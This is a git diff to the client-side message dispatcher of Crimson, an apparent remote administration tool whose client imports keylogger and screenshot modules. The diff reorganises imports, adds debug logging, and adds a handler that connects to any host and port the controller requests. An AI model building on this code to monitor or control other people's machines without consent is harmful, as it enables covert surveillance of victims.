@@ -21,6 +21,7 @@ import java.awt.HeadlessException;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.IOException;
+import java.net.ConnectException;
 
 import javax.imageio.ImageIO;
 import javax.security.auth.DestroyFailedException;
@@ -34,14 +35,19 @@ import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.client.modules.Power;
 import com.subterranean_security.crimson.client.modules.QuickScreenshot;
+import com.subterranean_security.crimson.client.net.stream.CInfoSlave;
 import com.subterranean_security.crimson.client.store.ConfigStore;
-import com.subterranean_security.crimson.client.stream.CInfoSlave;
 import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
 import com.subterranean_security.crimson.core.misc.HCP;
 import com.subterranean_security.crimson.core.net.BasicExecutor;
+import com.subterranean_security.crimson.core.net.Connector;
 import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
+import com.subterranean_security.crimson.core.net.Connector.ConnectionType;
 import com.subterranean_security.crimson.core.net.MessageFuture.Timeout;
+import com.subterranean_security.crimson.core.net.stream.Stream;
+import com.subterranean_security.crimson.core.net.stream.StreamStore;
+import com.subterranean_security.crimson.core.net.stream.remote.RemoteSlave;
 import com.subterranean_security.crimson.core.platform.LocalFS;
 import com.subterranean_security.crimson.core.platform.Platform;
 import com.subterranean_security.crimson.core.proto.ClientAuth.MI_GroupChallengeResult;
@@ -59,22 +65,20 @@ import com.subterranean_security.crimson.core.proto.Log.LogType;
 import com.subterranean_security.crimson.core.proto.Log.RS_Logs;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.proto.Misc.Outcome;
+import com.subterranean_security.crimson.core.proto.Network.RQ_MakeDirectConnection;
 import com.subterranean_security.crimson.core.proto.Screenshot.RS_QuickScreenshot;
 import com.subterranean_security.crimson.core.proto.State.RS_ChangeClientState;
 import com.subterranean_security.crimson.core.proto.Stream.Param;
 import com.subterranean_security.crimson.core.proto.Update.RS_GetClientConfig;
 import com.subterranean_security.crimson.core.store.ConnectionStore;
 import com.subterranean_security.crimson.core.store.FileManagerStore;
-import com.subterranean_security.crimson.core.stream.Stream;
-import com.subterranean_security.crimson.core.stream.StreamStore;
-import com.subterranean_security.crimson.core.stream.remote.RemoteSlave;
 import com.subterranean_security.crimson.core.util.CryptoUtil;
 import com.subterranean_security.crimson.core.util.FileUtil;
 import com.subterranean_security.crimson.core.util.IDGen;
 import com.subterranean_security.crimson.core.util.RandomUtil;
 import com.subterranean_security.crimson.core.util.TempUtil;
 import com.subterranean_security.crimson.sc.Logsystem;
-import com.subterranean_security.crimson.universal.stores.DatabaseStore;
+import com.subterranean_security.crimson.universal.Universal;
 
 import io.netty.util.ReferenceCountUtil;
 
@@ -94,6 +98,9 @@ public class ClientExecutor extends BasicExecutor {
 				}
 
 				pool.submit(() -> {
+					if (Universal.debugNetwork) {
+						log.debug("Received: {}", m.toString());
+					}
 					if (m.hasEvStreamData()) {
 						ev_stream_data(m);
 					} else if (m.hasEvEndpointClosed()) {
@@ -132,6 +139,8 @@ public class ClientExecutor extends BasicExecutor {
 						rq_chat(m);
 					} else if (m.hasRqAddTorrent()) {
 						rq_add_torrent(m);
+					} else if (m.hasRqMakeDirectConnection()) {
+						rq_direct_connection(m);
 					} else {
 						connector.addNewResponse(m);
 					}
@@ -141,6 +150,21 @@ public class ClientExecutor extends BasicExecutor {
 			}
 
 		});
+
+	}
+
+	private void rq_direct_connection(Message m) {
+		RQ_MakeDirectConnection rq = m.getRqMakeDirectConnection();
+		Connector connector = new Connector(getInstanceExecutor());
+		try {
+			connector.connect(ConnectionType.DATAGRAM, rq.getHost(), rq.getPort());
+		} catch (ConnectException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (InterruptedException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 
 	}
 
